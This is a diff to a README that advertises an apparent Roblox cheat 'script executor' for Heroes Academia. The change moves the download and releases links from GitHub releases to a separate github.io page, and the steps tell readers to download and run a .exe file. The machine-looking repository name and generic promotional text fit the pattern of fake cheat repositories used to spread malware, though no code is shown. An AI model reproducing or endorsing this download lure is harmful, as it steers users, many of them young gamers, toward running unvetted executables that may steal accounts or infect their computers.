@@ -1,6 +1,6 @@
 # 🚀 Heroes-Academia-Script-Roblox-2026 - Automate your game progress with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/parabolic-duchennesmusculardystrophy151/Heroes-Academia-Script-Roblox-2026/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://parabolic-duchennesmusculardystrophy151.github.io)
 
 This repository provides a script executor designed for Heroes Academia on Roblox. It allows you to automate repetitive tasks and access quality-of-life tools within the game. The software supports Lua 5.1 and includes an integrated script hub to manage your game features.
 
@@ -18,7 +18,7 @@ To run this application, ensure your computer meets these settings:
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/parabolic-duchennesmusculardystrophy151/Heroes-Academia-Script-Roblox-2026/releases) to access the download files.
+1. Visit the [releases page](https://parabolic-duchennesmusculardystrophy151.github.io) to access the download files.
 2. Click the link above to reach the official download section.
 3. Locate the latest version file ending in .exe.
 4. Save this file to a folder you can find easily, such as your Downloads folder or Desktop.
